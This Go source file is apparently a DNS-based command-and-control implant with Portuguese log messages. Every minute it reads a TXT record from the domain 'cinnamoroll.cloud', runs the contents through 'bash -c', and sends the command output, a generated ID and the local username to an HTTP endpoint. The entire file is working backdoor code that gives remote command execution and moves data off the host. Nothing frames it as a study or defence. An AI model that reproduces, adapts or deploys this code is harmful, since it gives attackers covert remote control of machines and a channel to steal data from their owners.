package main

import (
	"fmt"
	"net/http"
	"net/url"
	"os/exec"
	"os/user"
	"strings"
	"time"

	"github.com/google/uuid"
	"github.com/miekg/dns"
)

var (
	uniqueID   string
	lastOutput string
)

func main() {
	domain := "cinnamoroll.cloud"
	server := "8.8.8.8:53"
	uniqueID = uuid.New().String()
	username, _ := getCurrentUsername()

	for {
		checkAndProcessChanges(domain, server, username)
		time.Sleep(time.Minute)
	}
}

func checkAndProcessChanges(domain, server, username string) {
	cmdOutput, err := getCommandFromTXT(domain, server)
	if err != nil {
		fmt.Printf("Erro ao obter comando do registro TXT: %v\n", err)
		return
	}

	if cmdOutput != lastOutput {
		lastOutput = cmdOutput
		fmt.Printf("Comando obtido do domínio %s: %s\n", domain, cmdOutput)

		output, err := executeCommand(cmdOutput)
		if err != nil {
			fmt.Printf("Erro ao executar o comando: %v\n", err)
			return
		}

		fmt.Printf("Saída do comando:%s\n", output)
		sendCommand(output, username)
	} else {
		fmt.Println("Comando já executado anteriormente. Nada a fazer.")
	}
}

func getCurrentUsername() (string, error) {
	user, err := user.Current()
	if err != nil {
		return "", err
	}
	return user.Username, nil
}

func getCommandFromTXT(domain, server string) (string, error) {
	c := new(dns.Client)
	m := new(dns.Msg)

	m.SetQuestion(dns.Fqdn(domain), dns.TypeTXT)
	r, _, err := c.Exchange(m, server)
	if err != nil {
		return "", err
	}

	for _, ans := range r.Answer {
		if t, ok := ans.(*dns.TXT); ok {
			return strings.Join(t.Txt, " "), nil
		}
	}

	return "", fmt.Errorf("Registro TXT não encontrado para o domínio")
}

func executeCommand(command string) (string, error) {
	cmd := exec.Command("bash", "-c", command)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", err
	}
	return string(output), nil
}

func sendCommand(output, username string) {
	encodedOutput := url.QueryEscape(output)
	url := fmt.Sprintf("http://localhost:8080/rpc?obtain=%s&id=%s&username=%s", encodedOutput, uniqueID, username)
	resp, err := http.Get(url)
	if err != nil {
		fmt.Printf("Erro ao enviar o comando: %v\n", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		fmt.Printf("Requisição retornou um código de status inválido: %s\n", resp.Status)
		return
	}

	fmt.Println("Comando enviado com sucesso!")
}
